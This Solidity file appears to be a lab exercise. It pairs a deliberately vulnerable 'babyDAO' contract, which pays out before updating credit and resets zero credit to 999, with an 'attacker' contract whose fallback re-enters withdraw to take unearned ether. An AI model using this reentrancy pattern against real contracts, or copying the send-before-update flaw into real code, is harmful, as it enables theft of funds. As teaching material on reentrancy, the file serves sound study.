// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.26;

import "hardhat/console.sol";

contract attacker {
    address payable owner;
    babyDAO dao;
    bool public performAttack = true;

    event Log(string message);

    constructor(babyDAO _dao) {
        owner = payable(msg.sender);
        dao = _dao;
    }

    function attack() public payable {
        emit Log("donating");
        dao.donate(0);
        emit Log("withdrawing");
        dao.withdraw(1);
        emit Log("withdrawn");
    }

    function withdraw(uint256 amount) public {
        dao.withdraw(amount);
    }

    fallback() external payable {
        emit Log("fallback()");
        if (performAttack) {
            performAttack = false;
            emit Log("can attack");
            dao.withdraw(1);
        }
    }

    receive() external payable {
        emit Log("fallback()");
        if (performAttack) {
            performAttack = false;
            emit Log("can attack");
            dao.withdraw(1);
        }
    }

    function getJackpot() public payable {
        owner.send(address(dao).balance);
    }
}

contract babyDAO {
    mapping(address => uint256) public credit;

    event Log(string message);
    event LogInt(string message, uint256 num);
    event SendStatus(bool success, bytes data);

    function donate(uint256 amount) public payable {
        credit[msg.sender] += amount;
    }

    function withdraw(uint256 amount) public payable {
        emit Log("enter withdraw");
        console.log("enter withdraw", credit[msg.sender]);

        if (credit[msg.sender] >= amount) {
            emit LogInt("sending", credit[msg.sender]);
            console.log("sending", credit[msg.sender]);

            (bool sent, bytes memory data) = payable(msg.sender).call{value: amount * 10**18}("completed");
            emit SendStatus(sent, data);
            console.log("status", sent);

            if (credit[msg.sender] == 0) {
                emit Log("less than");
                console.log("less than");
                credit[msg.sender] = 999;
            } else {
                emit Log("not less than");
                console.log("not less than");
                credit[msg.sender] -= amount;
            }

            emit LogInt("balance", credit[msg.sender]);
            console.log("balance", credit[msg.sender]);
        }
    }

    fallback() external payable {}
    receive() external payable {}
}
